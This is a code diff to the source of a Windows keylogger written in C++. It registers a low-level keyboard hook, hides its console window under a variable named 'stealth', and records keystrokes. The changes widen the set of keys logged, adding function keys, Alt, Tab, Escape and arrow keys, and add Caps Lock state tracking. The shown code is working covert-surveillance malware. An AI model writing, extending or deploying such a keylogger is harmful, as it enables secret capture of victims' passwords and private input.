@@ -19,9 +19,14 @@ LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
         {
         // Invisible keys
         case VK_CAPITAL:
-            out << "<CAPLOCK>";
+            if((GetKeyState(VK_CAPITAL) & 0x0001) != 0){
+                out << "<CAPDOWN>";
+            }
+            else{
+                out << "<CAPON>";
+            }
             break;
-        case VK_SHIFT:
+        case VK_LSHIFT:  
             out << "<SHIFT>";
             break;
         case VK_LCONTROL:
@@ -46,18 +51,68 @@ LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
             out << "<BK>";
             break;
         case VK_LEFT:
-            out << "<LEFT>";
+            out << "<LEFTARROW>";
             break;
         case VK_RIGHT:
-            out << "<RIGHT>";
+            out << "<RIGHTARROW>";
             break;
         case VK_UP:
-            out << "<UP>";
+            out << "<UPARROW>";
             break;
         case VK_DOWN:
-            out << "<DOWN>";
+            out << "<DOWNARROW>";
             break;
-        // Visible keys
+        case VK_HOME:
+            out << "<HOME>";
+            break;
+        case VK_TAB:
+            out << "<TAB>";
+            break;
+        case VK_LWIN:
+            out << "<WINDOWS>";
+            break;
+        case VK_F1:
+            out << "<F1>";
+            break;
+        case VK_F2:
+            out << "<F2>";
+            break;
+        case VK_F3:
+            out << "<F3>";
+            break;
+        case VK_F4:
+            out << "<F4>";
+            break;
+        case VK_F5:
+            out << "<F5>";
+            break;
+        case VK_F6:
+            out << "<F6>";
+            break;
+        case VK_F7:
+            out << "<F7>";
+            break;
+        case VK_F8:
+            out << "<F8>";
+            break;
+        case VK_F9:
+            out << "<F9>";
+            break;
+        case VK_F10:
+            out << "<F10>";
+            break;
+        case VK_F11:
+            out << "<F11>";
+            break;
+        case VK_F12:
+            out << "<F12>";
+            break;
+        case VK_ESCAPE:
+            out << "<ESCAPE>";
+            break;
+        case VK_MENU:
+            out << "<ALT>";
+            break;
         default:
             out << char(tolower(p->vkCode));
         }
@@ -75,7 +130,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     AllocConsole();
     stealth = FindWindowA("ConsoleWindowClass", NULL);
     ShowWindow(stealth, 0);
-    
+
     // Set windows hook
     HHOOK keyboardHook = SetWindowsHookEx(
         WH_KEYBOARD_LL,
